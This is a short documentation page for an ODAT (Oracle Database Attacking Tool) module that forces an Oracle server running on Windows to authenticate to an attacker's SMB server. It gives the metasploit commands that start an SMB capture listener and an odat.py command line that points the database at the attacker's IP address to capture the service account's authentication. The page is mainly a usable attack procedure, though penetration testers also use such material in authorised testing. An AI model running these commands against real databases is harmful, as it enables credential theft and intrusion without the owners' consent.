
# Capture SMB authentication

This module allows to capture a SMB authentication.

Prerequisite in order to capture a challenge: 
* Oracle Database must be installed on __Windows__
* Oracle Database services must __not__ used a Windows __network service__ account, a __system__ account or a __local service__ account.

Notice: To use this module, a tool to capture SMB authentication must be used (e.g. [*metasploit*](https://www.rapid7.com/db/modules/auxiliary/server/capture/smb) or [*responder*](https://github.com/SpiderLabs/Responder)).

* In this example, I have used the *auxiliary/server/capture/smb* metasploit module to capture the SMB authentication:
```bash
msfconsole
[...]
msf auxiliary(smb) > use auxiliary/server/capture/smb
msf auxiliary(smb) > run
```

* To make connect the Oracle Database server to our smb server, the following ODAT command can be used :
```bash
./odat.py smb -s $SERVER -d $SID -U $USER -P $PASSWORD --capture $MY-IP-ADDRESS SHARE-NAME
```